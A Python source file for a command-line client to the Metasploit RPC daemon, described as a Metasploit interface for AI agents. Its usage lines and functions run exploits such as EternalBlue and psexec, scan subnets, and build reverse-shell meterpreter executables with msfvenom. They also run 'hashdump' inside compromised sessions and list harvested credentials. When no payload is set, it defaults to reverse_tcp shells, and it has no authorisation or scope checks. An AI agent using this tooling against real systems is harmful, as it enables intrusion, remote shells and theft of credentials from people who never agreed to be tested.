#!/usr/bin/env python3
"""
MSF RPC Client — Metasploit interface for AI agents.

Prerequisite: msfrpcd must be running.
    cd ~/metasploit-framework && eval "$(rbenv init - zsh)"
    ./msfrpcd -P $MSFRPC_PASS -S -a 127.0.0.1 -p 55553 -U msf

Usage:
    # Search modules
    python3 scripts/msf/msf_client.py search eternalblue

    # Module info
    python3 scripts/msf/msf_client.py info exploit/windows/smb/ms17_010_eternalblue

    # Run exploit
    python3 scripts/msf/msf_client.py exploit exploit/windows/smb/psexec \
        RHOSTS=10.10.10.1 SMBUser=admin SMBPass=hash LHOST=10.1.5.2

    # Run auxiliary
    python3 scripts/msf/msf_client.py auxiliary auxiliary/scanner/smb/smb_version \
        RHOSTS=10.10.10.0/24

    # Generate payload
    python3 scripts/msf/msf_client.py payload windows/x64/meterpreter/reverse_tcp \
        LHOST=10.1.5.2 LPORT=4444 -f exe -o /tmp/shell.exe

    # List sessions
    python3 scripts/msf/msf_client.py sessions

    # Run command in session
    python3 scripts/msf/msf_client.py session-run 1 sysinfo
    python3 scripts/msf/msf_client.py session-run 1 hashdump

    # Console command (general purpose)
    python3 scripts/msf/msf_client.py console "db_nmap -sV -p 445 10.10.10.0/24"

    # Query DB hosts/services
    python3 scripts/msf/msf_client.py db-hosts
    python3 scripts/msf/msf_client.py db-services
    python3 scripts/msf/msf_client.py db-creds
"""
import argparse
import json
import os
import subprocess
import sys
import time

from pymetasploit3.msfrpc import MsfRpcClient, MsfRpcError

MSFRPC_HOST = os.environ.get("MSFRPC_HOST", "127.0.0.1")
MSFRPC_PORT = int(os.environ.get("MSFRPC_PORT", "55553"))
MSFRPC_PASS = os.environ.get("MSFRPC_PASS", "changeme")
MSFRPC_USER = os.environ.get("MSFRPC_USER", "msf")
MSFRPC_SSL = False


def connect():
    try:
        client = MsfRpcClient(
            MSFRPC_PASS,
            server=MSFRPC_HOST,
            port=MSFRPC_PORT,
            username=MSFRPC_USER,
            ssl=MSFRPC_SSL,
        )
        return client
    except Exception as e:
        print(f"[!] Failed to connect to msfrpcd: {e}")
        print("    Make sure msfrpcd is running:")
        print(
            '    cd ~/metasploit-framework && eval "$(rbenv init - zsh)" && '
            "./msfrpcd -P $MSFRPC_PASS -S -a 127.0.0.1 -p 55553 -U msf"
        )
        sys.exit(1)


def cmd_search(client, args):
    """Search modules"""
    query = " ".join(args.query)
    cid = client.consoles.console().cid
    client.consoles.console(cid).write(f"search {query}\n")
    time.sleep(3)
    result = client.consoles.console(cid).read()
    print(result["data"])
    client.consoles.console(cid).destroy()


def cmd_info(client, args):
    """Module details"""
    cid = client.consoles.console().cid
    client.consoles.console(cid).write(f"info {args.module}\n")
    time.sleep(2)
    result = client.consoles.console(cid).read()
    print(result["data"])
    client.consoles.console(cid).destroy()


def cmd_exploit(client, args):
    """Run exploit"""
    exploit = client.modules.use("exploit", args.module)
    opts = _parse_options(args.options)
    for k, v in opts.items():
        exploit[k] = v

    if "PAYLOAD" not in opts:
        # Set default payload
        if "windows" in args.module:
            exploit["PAYLOAD"] = "windows/x64/meterpreter/reverse_tcp"
        elif "linux" in args.module:
            exploit["PAYLOAD"] = "linux/x64/meterpreter/reverse_tcp"

    print(f"[*] Running: {args.module}")
    print(f"[*] Options: {opts}")
    result = exploit.execute()
    print(f"[+] Job ID: {result.get('job_id')}")
    print(f"[+] UUID: {result.get('uuid')}")

    # Wait briefly then check for sessions
    time.sleep(5)
    sessions = client.sessions.list
    if sessions:
        print(f"[+] Active sessions: {json.dumps(sessions, indent=2)}")
    else:
        print("[*] No sessions yet. Check later with: sessions")


def cmd_auxiliary(client, args):
    """Run auxiliary module"""
    aux = client.modules.use("auxiliary", args.module)
    opts = _parse_options(args.options)
    for k, v in opts.items():
        aux[k] = v

    print(f"[*] Running: {args.module}")
    print(f"[*] Options: {opts}")

    cid = client.consoles.console().cid
    con = client.consoles.console(cid)
    option_str = " ".join(f"{k}={v}" for k, v in opts.items())
    con.write(f"use {args.module}\n")
    time.sleep(1)
    for k, v in opts.items():
        con.write(f"set {k} {v}\n")
        time.sleep(0.5)
    con.write("run\n")

    # Collect results (up to 60 seconds)
    output = ""
    for _ in range(30):
        time.sleep(2)
        r = con.read()
        output += r["data"]
        if r.get("busy") is False:
            break

    print(output)
    con.destroy()


def cmd_payload(client, args):
    """Generate payload via msfvenom (subprocess)"""
    msf_dir = subprocess.getoutput("echo ~/metasploit-framework").strip()
    cmd = [f"{msf_dir}/msfvenom", "-p", args.payload]

    opts = _parse_options(args.options)
    for k, v in opts.items():
        if k.startswith("-"):
            cmd.extend([k, v])
        else:
            cmd.append(f"{k}={v}")

    if args.format:
        cmd.extend(["-f", args.format])
    if args.output:
        cmd.extend(["-o", args.output])

    print(f"[*] Running: {' '.join(cmd)}")
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    if result.returncode == 0:
        if args.output:
            print(f"[+] Payload saved to: {args.output}")
        else:
            print(result.stdout)
    else:
        print(f"[!] Error: {result.stderr}")


def cmd_sessions(client, _args):
    """List active sessions"""
    sessions = client.sessions.list
    if not sessions:
        print("[*] No active sessions")
        return
    for sid, info in sessions.items():
        print(f"  Session {sid}: {info.get('type')} @ {info.get('session_host')} "
              f"({info.get('info', '')}) via {info.get('via_exploit', '')}")


def cmd_session_run(client, args):
    """Run command in session"""
    sid = int(args.session_id)
    command = " ".join(args.command)
    shell = client.sessions.session(sid)
    shell.write(command)
    time.sleep(3)
    output = shell.read()
    print(output)


def cmd_console(client, args):
    """Run console command (general purpose)"""
    command = " ".join(args.command)
    cid = client.consoles.console().cid
    con = client.consoles.console(cid)
    con.write(f"{command}\n")

    output = ""
    for _ in range(60):
        time.sleep(2)
        r = con.read()
        output += r["data"]
        if r.get("busy") is False:
            break

    print(output)
    con.destroy()


def cmd_db_hosts(client, _args):
    """Query DB hosts"""
    cid = client.consoles.console().cid
    con = client.consoles.console(cid)
    con.write("hosts\n")
    time.sleep(2)
    r = con.read()
    print(r["data"])
    con.destroy()


def cmd_db_services(client, _args):
    """Query DB services"""
    cid = client.consoles.console().cid
    con = client.consoles.console(cid)
    con.write("services\n")
    time.sleep(2)
    r = con.read()
    print(r["data"])
    con.destroy()


def cmd_db_creds(client, _args):
    """Query DB credentials"""
    cid = client.consoles.console().cid
    con = client.consoles.console(cid)
    con.write("creds\n")
    time.sleep(2)
    r = con.read()
    print(r["data"])
    con.destroy()


def _parse_options(opts_list):
    """Parse KEY=VALUE options"""
    result = {}
    if not opts_list:
        return result
    for opt in opts_list:
        if "=" in opt:
            k, v = opt.split("=", 1)
            result[k] = v
    return result


def main():
    parser = argparse.ArgumentParser(description="MSF RPC Client for AI agents")
    sub = parser.add_subparsers(dest="command")

    # search
    p = sub.add_parser("search", help="Search modules")
    p.add_argument("query", nargs="+")

    # info
    p = sub.add_parser("info", help="Module info")
    p.add_argument("module")

    # exploit
    p = sub.add_parser("exploit", help="Run exploit")
    p.add_argument("module")
    p.add_argument("options", nargs="*", help="KEY=VALUE options")

    # auxiliary
    p = sub.add_parser("auxiliary", help="Run auxiliary module")
    p.add_argument("module")
    p.add_argument("options", nargs="*", help="KEY=VALUE options")

    # payload
    p = sub.add_parser("payload", help="Generate payload (msfvenom)")
    p.add_argument("payload")
    p.add_argument("options", nargs="*", help="KEY=VALUE or -flag value")
    p.add_argument("-f", "--format", help="Output format (exe, elf, raw, psh-cmd)")
    p.add_argument("-o", "--output", help="Output file path")

    # sessions
    sub.add_parser("sessions", help="List active sessions")

    # session-run
    p = sub.add_parser("session-run", help="Run command in session")
    p.add_argument("session_id")
    p.add_argument("command", nargs="+")

    # console
    p = sub.add_parser("console", help="Console command (general purpose)")
    p.add_argument("command", nargs="+")

    # db
    sub.add_parser("db-hosts", help="Query DB hosts")
    sub.add_parser("db-services", help="Query DB services")
    sub.add_parser("db-creds", help="Query DB credentials")

    args = parser.parse_args()
    if not args.command:
        parser.print_help()
        sys.exit(1)

    client = connect()

    cmds = {
        "search": cmd_search,
        "info": cmd_info,
        "exploit": cmd_exploit,
        "auxiliary": cmd_auxiliary,
        "payload": cmd_payload,
        "sessions": cmd_sessions,
        "session-run": cmd_session_run,
        "console": cmd_console,
        "db-hosts": cmd_db_hosts,
        "db-services": cmd_db_services,
        "db-creds": cmd_db_creds,
    }
    cmds[args.command](client, args)


if __name__ == "__main__":
    main()
